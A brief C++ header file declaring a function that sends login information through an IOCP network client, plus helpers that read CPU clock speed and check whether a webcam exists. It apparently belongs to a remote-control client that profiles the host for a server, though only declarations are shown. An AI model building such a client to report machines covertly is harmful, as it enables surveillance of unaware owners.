#pragma once

#include "IOCPClient.h"
#include <Vfw.h>

#pragma comment(lib,"Vfw32.lib")

int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed, int nType);
DWORD CPUClockMHz();
BOOL WebCamIsExist();
